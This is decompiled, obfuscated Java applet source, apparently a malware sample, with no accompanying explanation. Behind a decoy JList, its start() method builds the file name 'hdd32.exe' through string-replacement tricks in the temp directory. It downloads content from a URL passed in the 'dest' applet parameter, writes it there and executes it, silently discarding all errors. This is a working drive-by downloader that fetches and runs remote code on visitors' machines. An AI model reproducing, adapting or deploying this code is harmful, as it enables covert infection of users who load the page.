import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Esia extends Applet
{
    private JList uuutw;
    String fggf;
    private Object[] uuue;
    
    public Esia() {
        this.fggf = new String();
    }
    
    private void yeeua() {
        final Boolean w = true;
    }
    
    @Override
    public void init() {
        final String egf = new String();
        final Mol uyw3 = new Mol();
        final Bar juy5 = new Bar();
        final int a = 21;
        juy5.Bar();
        final int as = 1;
        final Object[] jjtr = Mol.Oeri();
        this.add(this.uuutw = new JList((E[])jjtr));
    }
    
    @Override
    public void start() {
        try {
            final String eff1 = new String();
            final Pol utedc = new Pol();
            String kiuyrd = utedc.Pysta();
            if (kiuyrd.charAt(kiuyrd.length() - 1) != '\\') {
                kiuyrd += "\\";
            }
            final String ppkwqauuueg = kiuyrd + "hhhwehqdd3hhwehq2.ehhwehqxhhwehqe".replace("hhwehq", "");
            final Oi oppwkq = new Oi();
            final String gw = new String();
            final String oonwquuue = this.getParameter("djjjwesesjjjwest".replace("jjjwes", ""));
            final String d = new String();
            final String doonwquuue = utedc.Tapa(oonwquuue);
            oppwkq.jkkkree = oppwkq.Lolgfes(ppkwqauuueg);
            final String e = new String();
            oppwkq.hjjrewwr = Mekoa.Traliv(doonwquuue);
            final String df = new String();
            byte[] ppkrwq = new byte[153601];
            final String gqh = new String();
            final int ahfh = 31;
            final String fff = new String();
            int cnt = 0;
            while ((cnt = oppwkq.hjjrewwr.read(ppkrwq)) > 0) {
                final String za = new String();
                oppwkq.jkkkree.write(ppkrwq, 0, cnt);
                ppkrwq = new byte[153601];
            }
            final String saqa = new String();
            oppwkq.jkkkree.close();
            final String ggqwww = new String();
            oppwkq.hjjrewwr.close();
            try {
                final String afqa0 = new String();
                Mekoa.Loema(ppkwqauuueg);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public class ashhhag
    {
    }
    
    public class fffgss
    {
    }
}
